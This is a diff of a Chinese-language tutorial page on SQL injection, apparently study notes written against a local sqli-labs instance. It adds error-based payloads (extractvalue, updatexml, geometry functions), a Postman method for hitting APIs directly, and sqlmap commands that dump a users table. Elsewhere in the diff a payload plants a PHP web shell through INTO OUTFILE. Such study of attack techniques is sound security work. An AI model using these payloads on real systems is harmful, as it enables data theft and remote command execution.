@@ -516,12 +516,76 @@ schemata表 - 存储所有数据库名
 
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223192430675.png" alt="image-20231223192430675"></p>
 <p>我们需要的内容就出现了</p>
-<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27;and (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -</span><br></pre></td></tr></table></figure>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>​	当网站的页面上没有显示位用于展示SQL语句执行后的结果，但是sql语句执行可以输出错误信息，那么攻击者可以利用注入过程中返回的错误信息进行判断。</p>
+<p>​	报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
+<h5 id="常用的函数"><a href="#常用的函数" class="headerlink" title="常用的函数"></a>常用的函数</h5><p>（1）extractvalue()</p>
+<p>（2）updataxml()</p>
+<p>（3）count()+rand()+floor()+group by()导致的主键重复</p>
+<h6 id="extractvalue（）"><a href="#extractvalue（）" class="headerlink" title="extractvalue（）"></a>extractvalue（）</h6><p>extractvalue（xml_document,xpath_string）</p>
+<p>第一个参数是xml文档对象的名称</p>
+<p>第二个参数作用是从xml文档对象中返回查询到的字符串值，返回结果长度限制在32位字符。</p>
+<p>payload：extractvalue(null,concat(0x7e,(sqli_inject),0x7e))</p>
+<p>注：利用extractvalue（）对数据进行一个排序，指定第一个参数为null，可以换成1、#或者其他符号，使其报错，并执行第二个参数语句。0x7e表示”-“号。</p>
+<h6 id="updetaxml（）"><a href="#updetaxml（）" class="headerlink" title="updetaxml（）"></a>updetaxml（）</h6><p>updatexml（xml_document,xpath_string,new_value）</p>
+<p>第一个参数，xml文档名称</p>
+<p>第二个参数，xpath格式字符串</p>
+<p>第三个参数，替换查找到的符合条件的数据</p>
+<pre><code>    作用是，改变文档中符合条件的节点的值
+</code></pre>
+<p>payload格式如下:</p>
+<p>updatexml(1,concat(0x7e,(sqli_inject),0x7e),1)</p>
+<h5 id="实际演示"><a href="#实际演示" class="headerlink" title="实际演示"></a>实际演示</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27;and (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- -</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">(extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br><span class="line"></span><br><span class="line">(updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br><span class="line"></span><br><span class="line">geometrycollection((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multipoint((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">polygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multipolygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">linestring((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multilinestring((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224101324836.png" alt="image-20231224101324836"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224101955130.png" alt="image-20231224101955130"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102040340.png" alt="image-20231224102040340"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102115408.png" alt="image-20231224102115408"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geometrycollection((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102149354.png" alt="image-20231224102149354"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102214772.png" alt="image-20231224102214772"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102240751.png" alt="image-20231224102240751"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102308793.png" alt="image-20231224102308793"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102404855.png" alt="image-20231224102404855"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102433978.png" alt="image-20231224102433978"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224102504654.png" alt="image-20231224102504654"></p>
+<h4 id="Postman与sql注入"><a href="#Postman与sql注入" class="headerlink" title="Postman与sql注入"></a>Postman与sql注入</h4><p>进入网站后如果需要使用网站功能进行sql注入可以使用postman进行协助</p>
+<p>进入网站之后直接键盘点击F12，打开开发者工具，选择网络</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224104441076.png" alt="image-20231224104441076"></p>
+<p>点击开发者工具左上方的删除符号，清空已出现的内容<img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224104547948.png" alt="image-20231224104547948"></p>
+<p>在输入栏内输入正常搜索内容，点击搜索</p>
+<p>然后网络中就会出现一条新的记录</p>
+<p>鼠标右键该记录，选择编辑并重发</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224104921364.png" alt="image-20231224104921364"></p>
+<p>左边便出现该栏：</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224105034465.png" alt="image-20231224105034465"></p>
+<p>直接复制post&#x2F;get后方内容，后续需要用到。</p>
+<p>打开postman，记得登陆一下，windows账号可以直接登陆</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224105422925.png" alt="image-20231224105422925"></p>
+<p>点+号添加一个运行页面</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224105758297.png" alt="image-20231224105758297"></p>
+<p>将刚刚的网址复制到里面，根据开发者工具的post&#x2F;get选择发送方法。</p>
+<p><img src="/9.1-sql%E6%B3%A8%E5%85%A5.assets/image-20231224110305176.png" alt="image-20231224110305176"></p>
+<p>postman中会直接出现内容，可以根据自身输入的内看出需要更改的部分，api返回的内容会在下方body-Pretty中显示。</p>
+<p>我们便可以更改图中id的内容进行sql注入，流程和正常sql注入一样，使用postman进行sql注入可以直接跳过前端防御直接对api进行攻击而api部分一般防御较少，攻击成功率更高。</p>
 <h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>盲注又可以分为布尔盲注和时间盲注。</p>
 <h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>该语句很重要，可以通过它来判断数据库中每个字符，通过ascii字符来判断。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;and ascii(substring(database(),1,1))=115--+</span><br></pre></td></tr></table></figure>
@@ -541,10 +605,83 @@ schemata表 - 存储所有数据库名
 
 <p>输入该语句可以查询数据库内容放置位置</p>
 <p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223193846084.png" alt="image-20231223193846084"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,@@datadir,&quot;&lt;?php @system($_GET[a]);  ?&gt;&quot; into outfile &quot;地址&quot; -- -</span><br></pre></td></tr></table></figure>
 
 <p>地址内斜杠需要用双斜杠代替，不然内容传输不过去。</p>
-<h4 id="sql注入工具"><a href="#sql注入工具" class="headerlink" title="sql注入工具"></a>sql注入工具</h4><h2 id="重要语句"><a href="#重要语句" class="headerlink" title="重要语句"></a>重要语句</h2><p>?id&#x3D;1</p>
+<h4 id="sql注入工具（sqlmap）"><a href="#sql注入工具（sqlmap）" class="headerlink" title="sql注入工具（sqlmap）"></a>sql注入工具（sqlmap）</h4><ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/archive/refs/tags/1.7.zip">下载地址</a></li>
+</ol>
+<p>sqlmap中有python程序会报毒，解压运行之前请关闭杀毒软件。</p>
+<ol start="2">
+<li>在文件根目录下运行cmd命令</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224091933908.png" alt="image-20231224091933908"></p>
+<ol start="3">
+<li>查看sqlmap命令</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -h</span><br></pre></td></tr></table></figure>
+
+<p>   <img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224092310756.png" alt="image-20231224092310756"></p>
+<p>显示上面内容则表示sqlmap能够正常运行。</p>
+<p>使用方法: python3 sqlmap [选项]</p>
+<p>选项:<br> -h, –help            显示基本帮助消息并退出<br> -hh                   显示高级帮助消息并退出<br> –version             显示程序的版本号并退出<br> -v VERBOSE            详细级别: 0-6(默认为1)</p>
+<p>目标:<br> 为了定义目标,至少需要提供以下一个选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-u URL, --url=URL   目标URL(例如 &quot;http://www.site.com/vuln.php?id=1&quot;)</span><br><span class="line">-g GOOGLEDORK       处理Google搜索词结果作为目标URL</span><br></pre></td></tr></table></figure>
+
+<p>请求:<br> 这些选项可以用来指定如何连接到目标URL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--data=DATA         通过POST发送的数据字符串(例如 &quot;id=1&quot;) </span><br><span class="line">--cookie=COOKIE     HTTP Cookie头的值(例如&quot;PHPSESSID=a8d127e..&quot;)</span><br><span class="line">--random-agent      使用随机选择的HTTP用户代理头值</span><br><span class="line">--proxy=PROXY       使用代理连接到目标URL</span><br><span class="line">--tor               使用Tor匿名网络</span><br><span class="line">--check-tor         检查是否正确使用Tor</span><br></pre></td></tr></table></figure>
+
+<p>注入:<br> 这些选项可以用来指定测试哪些参数,提供自定义注入有效负载和可选篡改脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-p TESTPARAMETER    可测试的参数</span><br><span class="line">--dbms=DBMS         强制后端DBMS为提供的值</span><br></pre></td></tr></table></figure>
+
+<p>检测:<br> 这些选项可以用来自定义检测阶段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--level=LEVEL       测试级别(1-5,默认1)</span><br><span class="line">--risk=RISK         测试风险(1-3,默认1)</span><br></pre></td></tr></table></figure>
+
+<p>技术:<br> 这些选项可以用来微调特定的SQL注入技术测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--technique=TECH..  要使用的SQL注入技术(默认为&quot;BEUSTQ&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>枚举:<br> 这些选项可以用来枚举后端数据库管理系统的信息,结构和表中的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-a, --all           检索所有信息</span><br><span class="line">-b, --banner        检索DBMS版本信息</span><br><span class="line">--current-user      检索DBMS当前用户</span><br><span class="line">--current-db        检索DBMS当前数据库</span><br><span class="line">--passwords         枚举DBMS用户密码哈希</span><br><span class="line">--dbs               枚举DBMS数据库</span><br><span class="line">--tables            枚举DBMS数据库表</span><br><span class="line">--columns           枚举DBMS数据库表字段</span><br><span class="line">--schema            枚举DBMS架构</span><br><span class="line">--dump              转储DBMS数据库表条目</span><br><span class="line">--dump-all          转储所有DBMS数据库表条目</span><br><span class="line">-D DB               要枚举的DBMS数据库</span><br><span class="line">-T TBL              要枚举的DBMS数据库表</span><br><span class="line">-C COL              要枚举的DBMS数据库表字段</span><br></pre></td></tr></table></figure>
+
+<p>操作系统访问:<br> 这些选项可以用来访问后端数据库管理系统底层的操作系统</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--os-shell          提示交互式操作系统shell</span><br><span class="line">--os-pwn            提示外部shell, meterpreter或VNC</span><br></pre></td></tr></table></figure>
+
+<p>一般:<br> 这些选项可以用来设置一些常规工作参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--batch             永远不要求用户输入,使用默认行为</span><br><span class="line">--flush-session     清除当前目标的会话文件</span><br></pre></td></tr></table></figure>
+
+<p>杂项:<br> 这些选项不属于任何其他类别</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--wizard            简单向导界面用于初学者</span><br></pre></td></tr></table></figure>
+
+<p>[!] 要查看完整选项列表,请使用’-hh’</p>
+<p>查询数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.100/sqli/Less-1/?id=1&quot; --dbs</span><br></pre></td></tr></table></figure>
+
+<p>该代码运行期间会需要确定两次，直接输入y确定即可。</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224093602031.png" alt="image-20231224093602031"></p>
+<p>查询数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u &quot;http://192.168.2.100/sqli/Less-1/?id=1&quot;  --batch -D security --tables </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224094432296.png" alt="image-20231224094432296"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">[4 tables]</span><br><span class="line">+----------+</span><br><span class="line">| emails   |</span><br><span class="line">| referers |</span><br><span class="line">| uagents  |</span><br><span class="line">| users    |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure>
+
+<p>可以看到security库中有这些表。</p>
+<p>查询数据表结构</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224095606959.png" alt="image-20231224095606959"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| id       | int(3)      |</span><br><span class="line">| password | varchar(20) |</span><br><span class="line">| username | varchar(20) |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure>
+
+<p>查询表数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap  -u &quot;http://192.168.2.100/sqli/Less-1/?id=1&quot;  --batch -D security -T users -C &quot;id,username&quot; --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224100006895.png" alt="image-20231224100006895"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+----------+</span><br><span class="line">| id | username |</span><br><span class="line">+----+----------+</span><br><span class="line">| 1  | Dumb     |</span><br><span class="line">| 2  | Angelina |</span><br><span class="line">| 3  | Dummy    |</span><br><span class="line">| 4  | secure   |</span><br><span class="line">| 5  | stupid   |</span><br><span class="line">| 6  | superman |</span><br><span class="line">| 7  | batman   |</span><br><span class="line">| 8  | admin    |</span><br><span class="line">| 9  | admin1   |</span><br><span class="line">| 10 | admin2   |</span><br><span class="line">| 11 | admin3   |</span><br><span class="line">| 12 | dhakkan  |</span><br><span class="line">| 14 | admin4   |</span><br><span class="line">+----+----------+</span><br></pre></td></tr></table></figure>
+
+<p>表的数据就可以直观的展示出来了</p>
+<h2 id="重要语句"><a href="#重要语句" class="headerlink" title="重要语句"></a>重要语句</h2><p>?id&#x3D;1</p>
 <p>?id&#x3D;1’– -</p>
 <p>?id&#x3D;1’order by 3– -</p>
 <p>?id&#x3D;-1’union select 1,2,3–+</p>
